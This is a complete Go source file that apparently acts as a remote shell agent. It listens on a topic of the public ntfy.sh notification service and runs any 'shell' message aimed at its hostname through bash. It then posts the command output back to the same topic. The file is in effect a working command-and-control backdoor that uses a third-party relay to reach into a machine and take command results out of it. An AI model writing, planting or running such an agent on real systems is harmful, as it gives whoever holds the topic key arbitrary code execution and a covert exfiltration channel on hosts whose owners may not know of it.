package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
)

type ws_msg struct {
	Id      string `json:"id"`
	Time    int    `json:"time"`
	Event   string `json:"event"`
	Topic   string `json:"topic"`
	Message string `json:"message"`
}

type payload struct {
	Kind   string `json:"kind"`
	Text   string `json:"text"`
	Target string `json:"target"`
}

var addr = "https://ntfy.sh/"

func (p payload) execute() (string, error) {
	shell := exec.Command("bash", "-c", p.Text)
	stdout, err := shell.Output()
	return string(stdout), err
}

func catch(er error) {
	if er != nil {
		log.Println(er)
	}
}

func main() {
	key := os.Args[1]
	log.Println("using key: "+key)
	resp, err := http.Get(addr+key+"/json")
	catch(err)
	reader := bufio.NewReader(resp.Body)
	for {
		line, err := reader.ReadBytes('\n')
		catch(err)
		log.Println(string(line))
		var ms ws_msg
		json.Unmarshal(line, &ms)
		if ms.Message != "" {
			var pl payload
			json.Unmarshal([]byte(ms.Message), &pl)
			log.Println(pl)
			hostname, err := os.Hostname()
			catch(err)
			if pl.Kind == "shell" && pl.Target == hostname {
				stdout, err := pl.execute()
				catch(err)
				log.Println(stdout)
				response := payload{
					Kind:   "response",
					Target: hostname,
					Text:   stdout,
				}
				jsonBody, err := json.Marshal(response)
				bodyReader := bytes.NewReader(jsonBody)
				catch(err)
				req, err := http.NewRequest(http.MethodPost, addr+key, bodyReader)
				catch(err)
				client := &http.Client{}
				resp, err := client.Do(req)
				catch(err)
				b, err := io.ReadAll(resp.Body)
				catch(err)
				log.Println(string(b))
			}

		}
	}
}
